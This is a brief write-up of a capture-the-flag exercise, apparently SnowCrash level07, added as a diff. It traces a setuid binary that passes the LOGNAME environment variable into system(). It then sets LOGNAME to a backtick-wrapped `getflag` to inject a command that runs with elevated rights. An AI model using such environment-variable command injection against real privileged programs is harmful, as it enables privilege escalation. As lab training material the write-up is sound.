@@ -1,0 +1,24 @@
+~$ ll
+-> [...]
+   -rwsr-sr-x 1 flag07  level07 8805 Mar  5  2016 level07*
+   [...]
+
+~$ ./level07
+-> level07
+
+~$ ltarce level07
+-> [...]
+   getenv("LOGNAME") = "level07"
+   [...]
+   system("/bin/echo level07 "level07
+   [...]
+
+In that case LONGANE = level07
+And thent we print that result
+We can change it to `getflag`
+
+~$ export LOGNAME="\`getflag\`"
+
+Password: getflag in script
+
+Voila!
